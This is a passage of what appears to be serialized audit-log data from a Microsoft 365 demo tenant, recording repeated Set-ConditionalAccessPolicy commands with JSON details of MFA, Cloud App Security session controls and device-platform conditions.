'{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/19/2020 5:37:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/19/2020 5:37:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/20/2020 2:21:06 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/20/2020 2:21:04 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/20/2020 6:04:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/20/2020 6:04:35 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/21/2020 2:08:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/21/2020 2:08:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/21/2020 4:59:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/21/2020 4:59:02 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/22/2020 2:14:16 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/22/2020 2:14:19 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/22/2020 5:08:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/22/2020 5:08:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:41 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:40 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/23/2020 2:20:38 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/23/2020 5:19:51 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/23/2020 5:19:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 2:30:33 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/24/2020 2:30:33 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 4:59:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/24/2020 4:59:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/25/2020 2:21:52 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': 